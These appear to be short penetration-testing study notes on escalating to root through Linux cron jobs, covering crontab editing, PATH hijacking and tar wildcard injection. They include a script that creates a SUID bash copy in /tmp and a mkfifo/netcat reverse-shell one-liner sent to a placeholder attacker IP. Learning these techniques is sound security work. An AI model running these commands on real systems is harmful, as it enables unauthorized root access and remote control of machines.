## File Permission
cron jobs that runs with root privilege can be used as a privilege escalation method.
See the systemwide crontabs(cron table file) `cat /etc/crontab` to see what jobs run with root privilee then edit those file if possible to run reverse shell.

## PATH environment variable
even if we can't change the cron jobs, we can maybe overwrite the file by abusing the PATH variable priority(where PATH is read left to right) if we have a permission to write into the higher priority PATH. Basically make the same file as a cronjob so that your file would be the one that is read.
Then create a root shell with this script
```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash
chmod +xs /tmp/rootbash
```

## Wildcards
using wildcard as an argument can break privilege. In this example a shell cronjob that runs tar use a wildcard argument in the lowe privilege user folder. The user can make a file that disguised as an argument and abuse the cron jobs privilege to run reverse root shell.
```bash
touch /home/user/--checkpoint=1  
touch /home/user/--checkpoint-action=exec=shell.elf

# OR THIS ONE WHERE TAR IS RAN ON /var/www/html
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
1234 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"

```
The command above make a file with a filename that looks like an argument. The argument makes tar go to a checkpoint, and do something(in this case exec a reverse shell executable) in those checkpoint.